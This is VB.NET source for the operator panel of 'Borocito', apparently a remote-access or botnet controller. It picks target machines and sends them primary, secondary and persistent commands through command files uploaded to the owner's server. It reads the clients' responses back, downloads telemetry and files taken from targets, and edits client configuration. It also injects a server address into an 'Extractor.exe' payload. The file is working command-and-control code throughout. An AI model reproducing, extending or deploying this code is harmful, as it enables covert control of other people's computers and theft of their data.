Public Class Main
    Dim IsThreadReadCMDServerRunning As Boolean = False
    Dim ThreadReadCMDServer As Threading.Thread = New Threading.Thread(New Threading.ThreadStart(AddressOf ReadCommandFile))
    Dim isMonoChannel As Boolean = True
    Dim isCommandFileBusy As Boolean = False
    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        TabPage5.Enabled = False
        Panel1.Dock = DockStyle.Fill
        parameters = Command()
        ReadParameters(parameters)
    End Sub
    Private Sub Main_HelpRequested(sender As Object, hlpevent As HelpEventArgs) Handles Me.HelpRequested
        If MessageBox.Show("Borocito fue creado y desarrollado por Zhenboro." & vbCrLf & "¿Desea visitar el sitio oficial?", "Borocito Series", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
            Process.Start("https://github.com/Zhenboro/Borocito")
            Threading.Thread.Sleep(500)
            Process.Start("https://github.com/Zhenboro")
        End If
    End Sub
    Private Sub LoaderTimer_Tick(sender As Object, e As EventArgs) Handles LoaderTimer.Tick
        LoadIt()
    End Sub
    Sub LoadIt()
        Try
            Panel1.Visible = True
            LoaderTimer.Stop()
            LoaderTimer.Enabled = False
            Init()
            CheckBox2.Checked = isThemeActive
        Catch ex As Exception
            Label_Status.Text = AddToLog("LoadIt@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub Main_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If e.KeyCode = Keys.F5 Then
            Label2.Text = "Reloading..."
            ResetIt()
            Init()
        End If
    End Sub

    Sub ResetIt()
        Try
            ListBox1.Items.Clear()
            ListBox2.Items.Clear()
            ListBox3.Items.Clear()
        Catch ex As Exception
            Label_Status.Text = AddToLog("ResetIt@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged
        SetTarget(ListBox1.SelectedItem)
        If Not isMultiSelectMode Then
            RichTextBox2.SelectionColor = Color.Yellow
            RichTextBox2.AppendText(vbCrLf & Label4.Text)
            If isThemeActive Then
                RichTextBox2.SelectionColor = Color.LimeGreen
            Else
                RichTextBox2.SelectionColor = Color.Black
            End If
        End If
    End Sub
    Private Sub ListBox1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListBox1.MouseDoubleClick
        SetTarget(ListBox1.SelectedItem)
        Dim threadGetUserInfo As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf GetUserInfo))
        threadGetUserInfo.Start()
        'GetUserInfo()
    End Sub
    Private Sub ListBox2_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListBox2.MouseDoubleClick
        Dim threadGetTelemetryInfo As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf GetTelemetryInfo))
        threadGetTelemetryInfo.Start(ListBox2.SelectedItem)
        'GetTelemetryInfo(ListBox2.SelectedItem)
    End Sub
    Private Sub ListBox3_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListBox3.MouseDoubleClick
        Dim threadGetTelemetryFile As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf GetTelemetryFile))
        threadGetTelemetryFile.Start(ListBox3.SelectedItem)
        'GetTelemetryFile(ListBox3.SelectedItem)
    End Sub
    Private Sub RecargarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecargarToolStripMenuItem.Click
        IndexTelemetryFilesToPanel()
    End Sub
    Private Sub EliminarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EliminarToolStripMenuItem.Click
        DeleteTelemetryFile(ListBox3.SelectedItem)
    End Sub
    Private Sub Label_Status_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Label_Status.MouseDoubleClick
        Label_Status.Text = Nothing
        LastUserResponse = Nothing
    End Sub
    Private Sub RecargarToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RecargarToolStripMenuItem1.Click
        IndexUsersToPanel()
    End Sub
    Private Sub EliminarToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles EliminarToolStripMenuItem1.Click
        If MessageBox.Show("Esta accion eliminara todos los archivos relacionados a este usuario." & vbCrLf & "¿Eliminar el usuario" & ListBox1.SelectedItem & "?", "Eliminar usuario", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
            DeleteUserFile(ListBox1.SelectedItem)
        End If
    End Sub
    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        ThemeManager(CheckBox2.Checked)
        isThemeActive = CheckBox2.Checked
        SaveRegedit()
    End Sub
    Private Sub ListBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles ListBox1.KeyDown
        If e.KeyCode = Keys.ShiftKey Then
            If isMultiSelectMode Then
                ListBox1.SelectionMode = SelectionMode.One
                isMultiSelectMode = False
            Else
                ListBox1.SelectionMode = SelectionMode.MultiSimple
                isMultiSelectMode = True
            End If
        End If
    End Sub
    Private Sub ComboBox1_TextChanged(sender As Object, e As EventArgs) Handles ComboBox1.TextChanged
        If ComboBox1.Text.ToLower Like "*@multichannel*" Then
            RichTextBox2.AppendText(vbCrLf & "Multi channel activated!" & vbCrLf)
            isMonoChannel = False
            ComboBox1.Text = Nothing
        ElseIf ComboBox1.Text.ToLower Like "*@monochannel*" Then
            RichTextBox2.AppendText(vbCrLf & "Mono channel activated!" & vbCrLf)
            isMonoChannel = True
            ComboBox1.Text = Nothing
        ElseIf ComboBox1.Text.ToLower Like "*@exit*" Then
            End
        End If
    End Sub

    Sub SetCMDStatus(ByVal response As String, ByVal status As String, Optional ByVal ScrollRichBox As Boolean = True)
        Try
            If response <> Nothing Then
                RichTextBox2.AppendText(response)
            End If
            Label_Status.Text = status
            If ScrollRichBox Then
                RichTextBox2.ScrollToCaret()
            End If
        Catch ex As Exception
            Label_Status.Text = AddToLog("SetCMDStatus@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SetTarget(ByVal userValue As String)
        Try
            If isMultiSelectMode Then
                Label4.Text = "Target: <multiselect>"
                TabPage5.Enabled = True
            Else
                Label4.Text = "Target: " & userValue
                userTarget = userValue
                userIDTarget = userTarget.Replace("userID_", Nothing)
                userIDTarget = userIDTarget.Replace("telemetry_", Nothing)
                TabPage5.Enabled = True
            End If
        Catch ex As Exception
            Label_Status.Text = AddToLog("SetTarget@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub ComboBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles ComboBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            If ComboBox1.Text <> Nothing Then
                If isMultiSelectMode Then
                    For Each usuario As String In ListBox1.SelectedItems
                        SendCommandFile(usuario, ComboBox1.Text)
                    Next
                    RichTextBox2.AppendText(vbCrLf & "Server: Commands Sended! (" & ComboBox1.Text & ") to " & ListBox1.SelectedItems.Count & " users")
                Else
                    SendCommandFile(userIDTarget, ComboBox1.Text)
                End If
                Label_Status.Text = Nothing
                ComboBox1.Text = Nothing
                If IsThreadReadCMDServerRunning = False Then
                    Label_Status.Text = "CMD Response thread started!"
                    ThreadReadCMDServer.Start()
                    IsThreadReadCMDServerRunning = True
                End If
            End If
        ElseIf e.KeyCode = Keys.ControlKey Then
            If IsThreadReadCMDServerRunning = False Then
                Label_Status.Text = "CMD Response thread started!"
                ThreadReadCMDServer.Start()
                IsThreadReadCMDServerRunning = True
            End If
        End If
    End Sub
    Dim LastUserResponse As String = Nothing
    Sub ReadCommandFile()
        While True
            Try
                Dim LocalCommandFile As String = DIRCommons & "\[" & userIDTarget & "]Command.str"
                Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & userIDTarget & "]Command.str"
                Threading.Thread.Sleep(CommandRefreshDelay) '10 segundos
                If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                    My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                End If
                My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
                If Not isCommandFileBusy Then
                    'Actualizamos el contenido del fichero de comando directo (para el multiCanal)
                    If My.Computer.FileSystem.FileExists(DIRCommons & "\userCommand.str") Then
                        My.Computer.FileSystem.DeleteFile(DIRCommons & "\userCommand.str")
                    End If
                    My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", My.Computer.FileSystem.ReadAllText(LocalCommandFile), False)
                End If
                'Leer
                Dim TheResponse As String = LeerFicheroDesdeLinea(6, LocalCommandFile)
                If TheResponse = LastUserResponse Then
                    If TheResponse <> Nothing Then
                        SetCMDStatus(Nothing, "The response (" & TheResponse & ") is equal to last", False)
                    Else
                        SetCMDStatus(Nothing, "The command (" & IO.File.ReadAllLines(LocalCommandFile)(1).Split(">"c)(1).Trim() & ")  is equal to last", False)
                    End If
                Else
                    LastUserResponse = TheResponse
                    If LastUserResponse <> Nothing Or LastUserResponse <> TheResponse Then
                        SetCMDStatus(vbCrLf & "Client: " & LastUserResponse, Nothing)
                    End If
                End If
            Catch ex As Exception
                Label_Status.Text = AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
            End Try
        End While
    End Sub
    Sub SendCommandFile(ByVal user As String, ByVal command As String)
        isCommandFileBusy = True
        Label_Status.Text = "Sending command..."
        user = user.Replace("userID_", Nothing)
        user = user.Replace(".rtp", Nothing)
        userIDTarget = user
        Try
            Dim Lineas = IO.File.ReadAllLines(DIRCommons & "\userCommand.str")
            If My.Computer.FileSystem.FileExists(DIRCommons & "\userCommand.str") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\userCommand.str")
            End If
            Dim secundaryCommand As String = Lineas(2).Split(">"c)(1).Trim() 'Comando secundario
            Dim persistentCommand As String = Lineas(3).Split(">"c)(1).Trim() 'Comando persistente
            If Not isMonoChannel Then
                secundaryCommand = InputBox("Set secundary command", "Multi channel " & userIDTarget, secundaryCommand)
                persistentCommand = InputBox("Set persistent command", "Multi channel " & userIDTarget, persistentCommand)
            End If
            My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", "#Command Channel for Unique User" &
                                                    vbCrLf & "Command1>" & command &
                                                    vbCrLf & "Command2>" & secundaryCommand &
                                                    vbCrLf & "Command3>" & persistentCommand &
                                                    vbCrLf & "[Response]", False)
            My.Computer.Network.UploadFile(DIRCommons & "\userCommand.str", HostOwnerServer & "/Users/Commands/[" & user & "]Command.str", HostOwnerServerUser, HostOwnerServerPassword)
            If Not isMultiSelectMode Then
                RichTextBox2.AppendText(vbCrLf & "Server: Command Sended! (" & command & ")")
            End If
            LastUserResponse = Nothing
            RichTextBox2.ScrollToCaret()
        Catch ex As Exception
            Label_Status.Text = AddToLog("SendCommandFile@Main", "Error: " & ex.Message, True)
        End Try
        isCommandFileBusy = False
    End Sub
    Private Function LeerFicheroDesdeLinea(ByVal numeroLinea As Integer, ByVal nombreFichero As String) As String
        Dim fichero As New System.IO.FileInfo(nombreFichero)
        LeerFicheroDesdeLinea = Nothing
        If fichero.Exists Then
            Dim sr As System.IO.StreamReader
            Dim lineaActual As Integer = 1
            Try
                sr = New System.IO.StreamReader(fichero.FullName)
                While lineaActual < numeroLinea And Not sr.EndOfStream
                    sr.ReadLine()
                    lineaActual += 1
                End While
                LeerFicheroDesdeLinea = sr.ReadToEnd
            Catch ex As Exception
                RichTextBox2.AppendText(vbCrLf & "Error: " & ex.Message)
                Console.WriteLine("[LeerFicheroDesdeLinea@Main]Error: " & ex.Message)
            Finally
                If sr IsNot Nothing Then
                    sr.Close()
                    sr.Dispose()
                End If
            End Try
        End If
    End Function

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim injectableOpener As New OpenFileDialog
        injectableOpener.Filter = "All file types|*.*"
        injectableOpener.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        injectableOpener.Title = "Abrir ejecutable inyectable..."
        injectableOpener.FileName = "Extractor.exe"
        If injectableOpener.ShowDialog() = DialogResult.OK Then
            Dim injectableSaver As New SaveFileDialog
            injectableSaver.Filter = "Executable file|*.exe"
            injectableSaver.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            injectableSaver.Title = "Guardar ejecutable inyectado..."
            injectableSaver.FileName = "Extractor"
            If injectableSaver.ShowDialog() = DialogResult.OK Then
                If TextBox2.Text <> Nothing Then
                    PutInject(TextBox2.Text, injectableOpener.FileName, injectableSaver.FileName)
                Else
                    If MessageBox.Show("No ha ingresado un servidor para inyectar." & vbCrLf & "¿Desea usar el servidor actual?", "Injector", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                        PutInject(OwnerServer, injectableOpener.FileName, injectableSaver.FileName)
                    End If
                End If
            End If
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Dim LocalFilePath As String = DIRCommons & "\GlobalSettings.ini"
            Dim RemoteFilePath As String = HttpOwnerServer & "/GlobalSettings.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.FileSystem.WriteAllText(LocalFilePath, RichTextBox4.Text, False)
            My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
            MsgBox("Global Settings aplicado.", MsgBoxStyle.Information, "Configuracion Servidor")
        Catch ex As Exception
            Label_Status.Text = AddToLog("SendGlobalSettings@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            Dim LocalFilePath As String = DIRCommons & "\ClientConfig.ini"
            Dim RemoteFilePath As String = HostOwnerServer & "/Client.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.FileSystem.WriteAllText(LocalFilePath, RichTextBox5.Text, False)
            My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
            MsgBox("Client Settings aplicado.", MsgBoxStyle.Information, "Configuracion Servidor")
        Catch ex As Exception
            Label_Status.Text = AddToLog("SendClientSettings@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub ThemeManager(ByVal applyTheme As Boolean)
        Try
            If applyTheme Then
                'Aplicar thema
                Me.BackColor = Color.FromArgb(50, 50, 50)
                Me.BackColor = Color.Black
                Me.ForeColor = Color.LimeGreen
            Else
                'Desaplicar tema
                Me.BackColor = DefaultBackColor
                Me.ForeColor = DefaultForeColor
            End If

            For Each pagina As TabPage In TabControl1.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In TabControl2.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In TabControl3.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In TabControl4.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            GroupBox1.BackColor = Me.BackColor
            GroupBox1.ForeColor = Me.ForeColor

            GroupBox2.BackColor = Me.BackColor
            GroupBox2.ForeColor = Me.ForeColor

            GroupBox3.BackColor = Me.BackColor
            GroupBox3.ForeColor = Me.ForeColor

            GroupBox4.BackColor = Me.BackColor
            GroupBox4.ForeColor = Me.ForeColor

            GroupBox5.BackColor = Me.BackColor
            GroupBox5.ForeColor = Me.ForeColor

            RichTextBox1.BackColor = Me.BackColor
            RichTextBox1.ForeColor = Me.ForeColor

            RichTextBox2.BackColor = Me.BackColor
            RichTextBox2.ForeColor = Me.ForeColor

            RichTextBox3.BackColor = Me.BackColor
            RichTextBox3.ForeColor = Me.ForeColor

            RichTextBox4.BackColor = Me.BackColor
            RichTextBox4.ForeColor = Me.ForeColor

            RichTextBox5.BackColor = Me.BackColor
            RichTextBox5.ForeColor = Me.ForeColor

            ListBox1.BackColor = Me.BackColor
            ListBox1.ForeColor = Me.ForeColor

            ListBox2.BackColor = Me.BackColor
            ListBox2.ForeColor = Me.ForeColor

            ListBox3.BackColor = Me.BackColor
            ListBox3.ForeColor = Me.ForeColor

            ComboBox1.BackColor = Me.BackColor
            ComboBox1.ForeColor = Me.ForeColor

            TextBox2.BackColor = Me.BackColor
            TextBox2.ForeColor = Me.ForeColor

        Catch ex As Exception
            AddToLog("ThemeManager@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

#Region "LocalThings"
    Sub GetTelemetryInfo(ByVal fileName As String)
        Try
            Dim LocalTelemetryFile As String = DIRCommons & "\telemetry_" & fileName & ".tlm"
            Dim RemoteTelemetryFile As String = HttpOwnerServer & "/Telemetry/telemetry_" & fileName & ".tlm"
            If My.Computer.FileSystem.FileExists(LocalTelemetryFile) Then
                My.Computer.FileSystem.DeleteFile(LocalTelemetryFile)
            End If
            My.Computer.Network.DownloadFile(RemoteTelemetryFile, LocalTelemetryFile)
            RichTextBox3.Text = My.Computer.FileSystem.ReadAllText(LocalTelemetryFile)
        Catch ex As Exception
            Label_Status.Text = AddToLog("GetTelemetryInfo@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub GetTelemetryFile(ByVal file As String)
        Try
            Dim downloadRefresh As Boolean = False
            Label_Status.Text = "WAIT: Asking file info..."
            Dim LocalTelemetryFile As String = DIRCommons & "\" & file
            Dim RemoteTelemetryFile As String = HttpOwnerServer & "/Files/" & file
            If My.Computer.FileSystem.FileExists(LocalTelemetryFile) Then
                If MessageBox.Show("El fichero ya existe en local." & vbCrLf & "¿Desea descargarlo nuevamente?", "Confirmar", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                    Label_Status.Text = "WAIT: Downloading file from remote repository..."
                    My.Computer.FileSystem.DeleteFile(LocalTelemetryFile)
                Else
                    Label_Status.Text = "WAIT: Opening file from local repository..."
                    downloadRefresh = True
                End If
            End If
            If Not downloadRefresh Then
                If CheckBox1.Checked Then
                    My.Computer.Network.DownloadFile(HostOwnerServer & "/Files/" & file, LocalTelemetryFile, HostOwnerServerUser, HostOwnerServerPassword)
                Else
                    My.Computer.Network.DownloadFile(RemoteTelemetryFile, LocalTelemetryFile)
                End If
            End If
            Label_Status.Text = "File ready! Asking for confirmation..."
            If MessageBox.Show("¿Abrir el fichero '" & file & "'?", "Confirmar", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                Process.Start(LocalTelemetryFile)
            Else
                Process.Start("explorer.exe", "/select, " & LocalTelemetryFile)
            End If
            Label_Status.Text = Nothing
        Catch ex As Exception
            Label_Status.Text = AddToLog("GetTelemetryFile@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub GetUserInfo()
        Try
            Dim LocalUserFile As String = DIRCommons & "\userID_" & userIDTarget & ".rtp"
            Dim RemoteUserFile As String = HttpOwnerServer & "/Users/userID_" & userIDTarget & ".rtp"
            If My.Computer.FileSystem.FileExists(LocalUserFile) Then
                My.Computer.FileSystem.DeleteFile(LocalUserFile)
            End If
            My.Computer.Network.DownloadFile(RemoteUserFile, LocalUserFile)
            RichTextBox1.Text = My.Computer.FileSystem.ReadAllText(LocalUserFile)
        Catch ex As Exception
            Label_Status.Text = AddToLog("GetUserInfo@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
#End Region
End Class